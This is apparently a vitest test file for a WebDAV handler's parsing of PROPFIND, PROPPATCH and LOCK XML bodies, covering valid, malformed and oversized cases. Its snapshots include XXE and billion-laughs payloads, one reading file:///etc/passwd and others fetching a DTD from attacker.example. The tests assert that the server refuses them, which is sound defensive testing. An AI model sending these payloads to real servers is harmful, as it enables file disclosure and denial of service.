import { describe, expect, it } from "vitest";
import { BODIES, DOCUMENTS, EMPTY, EMPTY_BODIES, STATUS, TABLE } from "./xml-bodies-cases";
import { buildWorld } from "./world";

// XML request bodies for PROPFIND, PROPPATCH and LOCK (PRD §11, §12): the table and oracle of
// xml-bodies-cases.ts, against the handler.

const NOW = Date.UTC(2026, 10, 2);

describe("XML request bodies", () => {
  it.each(TABLE)("%s with %s", async (method, _label, body) => {
    const world = await buildWorld({ scope: null, access: "read-write" });
    const text = body.build(DOCUMENTS[method], method);
    const response = await world.call(method, "/files/photos/a.jpg", {
      headers: { depth: "0", "content-type": "application/xml" },
      body: text,
    });
    const reply = await response.text();
    const valid = body.verdict === "valid";
    expect(valid ? [DOCUMENTS[method].success] : STATUS[body.verdict]).toContain(response.status);
    const properties = await world.backends.files.properties([["photos", "a.jpg"]]);
    const stored = properties.ok ? (properties.value["photos/a.jpg"] ?? []) : [];
    const locks = await world.locks.covering(["files", "photos", "a.jpg"], {
      descendants: false,
      now: NOW,
    });
    // Only a valid PROPPATCH stores the property, and only a valid LOCK takes a lock.
    expect(stored.map((p) => p.name)).toEqual(
      valid && method === "PROPPATCH" ? ["{urn:z}note"] : [],
    );
    expect(locks.length).toBe(valid && method === "LOCK" ? 1 : 0);
    // Nothing from a declaration ever comes back.
    expect(reply).not.toContain("boom");
    expect(reply).not.toContain("lollol");
  });

  it.each(EMPTY)("%s with an empty body answers %i", async (method, status) => {
    const world = await buildWorld({ scope: null });
    for (const body of EMPTY_BODIES) {
      const response = await world.call(method, "/files/photos/a.jpg", {
        headers: { depth: "0" },
        body,
      });
      await response.body?.cancel();
      expect(response.status).toBe(status);
    }
  });
});

// The bodies of the table, written out: each one's verdict and the document it sends for PROPFIND
// (long ones by their start, end and length), and a digest of the documents for PROPPATCH and LOCK.
// A change to a body or to a verdict fails here, not only in the comparison with the handler.
const shown = (text: string) =>
  text.length > 200
    ? `${JSON.stringify(text.slice(0, 70))}…${JSON.stringify(text.slice(-50))} (${text.length})`
    : JSON.stringify(text);

/** A 32-bit FNV-1a digest of a body, enough to tell two bodies apart. */
const digest = (text: string) => {
  let hash = 0x811c9dc5;
  for (let index = 0; index < text.length; index += 1) {
    hash = Math.imul(hash ^ text.charCodeAt(index), 0x01000193) >>> 0;
  }
  return hash.toString(16).padStart(8, "0");
};

describe("the XML bodies, written out", () => {
  it("builds each PROPFIND body", () => {
    expect(
      BODIES.map(
        (body) =>
          `${body.label} (${body.verdict}): ${shown(body.build(DOCUMENTS.PROPFIND, "PROPFIND"))}`,
      ),
    ).toMatchInlineSnapshot(`
      [
        "the canonical document (valid): "<?xml version=\\"1.0\\" encoding=\\"utf-8\\"?><D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "no XML declaration (valid): "<D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "whitespace before the root (valid): "\\n  \\t<D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a byte order mark (valid): "﻿<?xml version=\\"1.0\\" encoding=\\"utf-8\\"?><D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a comment before the root (valid): "<?xml version=\\"1.0\\" encoding=\\"utf-8\\"?><!-- c --><D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a comment inside the root (valid): "<D:propfind xmlns:D=\\"DAV:\\"><!-- c --><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a processing instruction after the root (valid): "<D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind><?app x?>"",
        "another prefix for DAV: (valid): "<a:propfind xmlns:a=\\"DAV:\\"><a:prop><a:getetag/></a:prop></a:propfind>"",
        "DAV: as the default namespace (valid): "<propfind xmlns=\\"DAV:\\"><prop><getetag/></prop></propfind>"",
        "single-quoted namespace (valid): "<D:propfind xmlns:D='DAV:'><D:prop><D:getetag/></D:prop></D:propfind>"",
        "an unknown DAV: element (valid): "<D:propfind xmlns:D=\\"DAV:\\"><D:unknown-extension/><D:prop><D:getetag/></D:prop></D:propfind>"",
        "an unknown element in another namespace (valid): "<D:propfind xmlns:D=\\"DAV:\\"><X:ext xmlns:X=\\"urn:x\\"><X:deep/></X:ext><D:prop><D:getetag/></D:prop></D:propfind>"",
        "unknown attributes (valid): "<D:propfind xmlns:D=\\"DAV:\\" extra=\\"1\\" xml:lang=\\"en\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a CDATA section of whitespace (valid): "<D:propfind xmlns:D=\\"DAV:\\"><![CDATA[ ]]><D:prop><D:getetag/></D:prop></D:propfind>"",
        "whitespace after the root (valid): "<D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>\\n\\n"",
        "upper-case encoding and standalone (valid): "<?xml version=\\"1.0\\" encoding=\\"UTF-8\\" standalone=\\"yes\\"?><D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "nesting 32 levels deep (valid): "<D:propfind xmlns:D=\\"DAV:\\"><X:n xmlns:X=\\"urn:x\\"><X:n xmlns:X=\\"urn:x\\"><"…"n></X:n><D:prop><D:getetag/></D:prop></D:propfind>" (933)",
        "1,000 unknown siblings (valid): "<D:propfind xmlns:D=\\"DAV:\\"><X:s xmlns:X=\\"urn:x\\"/><X:s xmlns:X=\\"urn:x\\"/"…"urn:x\\"/><D:prop><D:getetag/></D:prop></D:propfind>" (22069)",
        "character and predefined entity references (valid): "<D:propfind xmlns:D=\\"DAV:\\"><X:t xmlns:X=\\"urn:x\\">&#65;&#x42;&amp;&lt;&gt;&quot;&apos;</X:t><D:prop><D:getetag/></D:prop></D:propfind>"",
        "the namespace declared on every element (valid): "<D:propfind xmlns:D=\\"DAV:\\"><D:prop xmlns:D=\\"DAV:\\"><D:getetag xmlns:D=\\"DAV:\\"/></D:prop></D:propfind>"",
        "a declaration and no root (malformed): "<?xml version=\\"1.0\\" encoding=\\"utf-8\\"?>"",
        "a body cut short by one character (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind"",
        "a body cut in half (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><D:prop"",
        "a mismatched end tag (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:other>"",
        "an unclosed root (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop>"",
        "two root elements (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind><D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "text before the root (malformed): "junk<D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "whitespace before the declaration (malformed): " <?xml version=\\"1.0\\" encoding=\\"utf-8\\"?><D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a declaration after the start (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><?xml version=\\"1.0\\" encoding=\\"utf-8\\"?><D:prop><D:getetag/></D:prop></D:propfind>"",
        "an undeclared prefix (malformed): "<D:propfind><D:prop><D:getetag/></D:prop></D:propfind>"",
        "an undefined entity (malformed): "<D:propfind xmlns:D=\\"DAV:\\">&undefined;<D:prop><D:getetag/></D:prop></D:propfind>"",
        "a character reference to NUL (malformed): "<D:propfind xmlns:D=\\"DAV:\\">&#0;<D:prop><D:getetag/></D:prop></D:propfind>"",
        "a raw control character (malformed): "<D:propfind xmlns:D=\\"DAV:\\">\\u0001<D:prop><D:getetag/></D:prop></D:propfind>"",
        "a raw < in an attribute (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><X:a xmlns:X=\\"urn:x\\" v=\\"<\\"/><D:prop><D:getetag/></D:prop></D:propfind>"",
        "an unquoted attribute (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><X:a xmlns:X=\\"urn:x\\" v=1/><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a duplicate attribute (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><X:a xmlns:X=\\"urn:x\\" v=\\"1\\" v=\\"2\\"/><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a name starting with a digit (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><1bad/><D:prop><D:getetag/></D:prop></D:propfind>"",
        "an unterminated CDATA section (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><![CDATA[ x<D:prop><D:getetag/></D:prop></D:propfind>"",
        "an unterminated comment (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><!-- x<D:prop><D:getetag/></D:prop></D:propfind>"",
        "a double hyphen in a comment (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><!-- a -- b --><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a bare DOCTYPE (malformed): "<!DOCTYPE propfind><D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "an internal entity (malformed): "<!DOCTYPE x [<!ENTITY e \\"boom\\">]><D:propfind xmlns:D=\\"DAV:\\">&e;<D:prop><D:getetag/></D:prop></D:propfind>"",
        "billion laughs (malformed): "<!DOCTYPE x [<!ENTITY a \\"lol\\"><!ENTITY b \\"&a;&a;&a;&a;&a;&a;&a;&a;&a;&"…"bbbbbbb;<D:prop><D:getetag/></D:prop></D:propfind>" (824)",
        "an external entity (malformed): "<!DOCTYPE x [<!ENTITY e SYSTEM \\"file:///etc/passwd\\">]><D:propfind xmlns:D=\\"DAV:\\">&e;<D:prop><D:getetag/></D:prop></D:propfind>"",
        "an external parameter entity (malformed): "<!DOCTYPE x [<!ENTITY % p SYSTEM \\"http://attacker.example/x.dtd\\"> %p;]><D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "an external DTD (malformed): "<!DOCTYPE x SYSTEM \\"http://attacker.example/x.dtd\\"><D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a root without a namespace (malformed): "<propfind xmlns:D=\\"DAV:\\"><prop><getetag/></prop></propfind>"",
        "a root in the namespace DAV (malformed): "<D:propfind xmlns:D=\\"DAV\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a root in the namespace dav: (malformed): "<D:propfind xmlns:D=\\"dav:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a root with the wrong name (malformed): "<D:propfindx xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfindx>"",
        "another method's document (malformed): "<?xml version=\\"1.0\\" encoding=\\"utf-8\\"?><D:lockinfo xmlns:D=\\"DAV:\\"><D:lockscope><D:exclusive/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockinfo>"",
        "nesting 5,000 levels deep (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><X:n xmlns:X=\\"urn:x\\"><X:n xmlns:X=\\"urn:x\\"><"…"n></X:n><D:prop><D:getetag/></D:prop></D:propfind>" (135069)",
        "100,000 elements (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><D:x/><D:x/><D:x/><D:x/><D:x/><D:x/><D:x/><"…"/><D:x/><D:prop><D:getetag/></D:prop></D:propfind>" (600069)",
        "2 MiB of whitespace (too big): "<D:propfind xmlns:D=\\"DAV:\\">                                           "…"        <D:prop><D:getetag/></D:prop></D:propfind>" (2097221)",
        "a 2 MiB text node (too big): "<D:propfind xmlns:D=\\"DAV:\\"><X:t xmlns:X=\\"urn:x\\">aaaaaaaaaaaaaaaaaaaaaa"…"aa</X:t><D:prop><D:getetag/></D:prop></D:propfind>" (2097248)",
      ]
    `);
  });

  it("builds each PROPPATCH and LOCK body", () => {
    expect(
      BODIES.map(
        (body) =>
          `${body.label}: ${digest(body.build(DOCUMENTS.PROPPATCH, "PROPPATCH"))} ${digest(body.build(DOCUMENTS.LOCK, "LOCK"))}`,
      ),
    ).toMatchInlineSnapshot(`
      [
        "the canonical document: 8cc54a3a 2a7af9a4",
        "no XML declaration: cdc0ec47 8b40f12d",
        "whitespace before the root: 7a9bbe56 4d98c870",
        "a byte order mark: b3870051 9e3ee5b3",
        "a comment before the root: e39e332a 62d34634",
        "a comment inside the root: 5e64cf3f b579ee45",
        "a processing instruction after the root: 74448f14 1ca28822",
        "another prefix for DAV:: 53b6f4b6 5f060faa",
        "DAV: as the default namespace: d2cc81fd 75a3965b",
        "single-quoted namespace: db11d04d 518335d7",
        "an unknown DAV: element: 48609734 a47b2792",
        "an unknown element in another namespace: 02556277 11fb062d",
        "unknown attributes: db3ddee8 210d6e5a",
        "a CDATA section of whitespace: 3c61bbbf f1a04d03",
        "whitespace after the root: a157a707 c6dd8ebd",
        "upper-case encoding and standalone: d9ec7be3 2b7043d9",
        "nesting 32 levels deep: 8f8e23c7 a828e9ed",
        "1,000 unknown siblings: da8a1b87 8d1f062d",
        "character and predefined entity references: a910e5d1 47b66fe1",
        "the namespace declared on every element: 872da365 097548e3",
        "a declaration and no root: a33359b8 a33359b8",
        "a body cut short by one character: 80d5eac3 d8cdfa01",
        "a body cut in half: f5de1639 1b1b812d",
        "a mismatched end tag: 6999c173 eed1aa86",
        "an unclosed root: 591f9c6c e09ef6dd",
        "two root elements: 26600bd9 4e354395",
        "text before the root: 61b2a37d 9a050e1f",
        "whitespace before the declaration: b9273930 6c0d846e",
        "a declaration after the start: 728ed2d0 3c4c0d4a",
        "an undeclared prefix: 7f8c0457 7082234f",
        "an undefined entity: 673ffb64 5878d70c",
        "a character reference to NUL: 9fbc0e09 38858fb3",
        "a raw control character: 55e552b4 57c108a4",
        "a raw < in an attribute: 17eee7a4 c6af1a96",
        "an unquoted attribute: 440778e1 960a21ef",
        "a duplicate attribute: 63dee0c8 827628ce",
        "a name starting with a digit: 5b9896f4 72ea93c8",
        "an unterminated CDATA section: d89dbcb7 6255c20b",
        "an unterminated comment: a9e1c6cc f576ee9a",
        "a double hyphen in a comment: b02b8ccf a9dbd177",
        "a bare DOCTYPE: 5d53e06c 19d8e803",
        "an internal entity: b99726b8 f272b618",
        "billion laughs: 8bf6f809 885d2ff9",
        "an external entity: 8c50a974 ef9e5684",
        "an external parameter entity: dc0eb20e 1a59ddb8",
        "an external DTD: b5e39505 2d091ff7",
        "a root without a namespace: 5a2d336f d827c9c1",
        "a root in the namespace DAV: 75a77427 69ce0063",
        "a root in the namespace dav:: ae410ba7 a75a7fcd",
        "a root with the wrong name: f58db6c7 2f00c9f3",
        "another method's document: e00ea300 8cc54a3a",
        "nesting 5,000 levels deep: 688ae5e7 a441a51d",
        "100,000 elements: be11c187 9e1d9bed",
        "2 MiB of whitespace: 0940ec47 ac40f12d",
        "a 2 MiB text node: b75f5d9c 04c30f30",
      ]
    `);
  });

  it("refuses what is not valid and answers an empty body", () => {
    expect(STATUS).toEqual({ malformed: [400], "too big": [413, 400] });
    expect(EMPTY).toEqual([
      ["PROPFIND", 207],
      ["PROPPATCH", 400],
      ["LOCK", 400],
    ]);
    expect(EMPTY_BODIES).toEqual(["", " \r\n\t"]);
    expect(TABLE.map(([method, label]) => `${method} ${label}`)).toHaveLength(3 * BODIES.length);
    expect(new Set(TABLE.map(([method]) => method))).toEqual(
      new Set(["PROPFIND", "PROPPATCH", "LOCK"]),
    );
  });
});
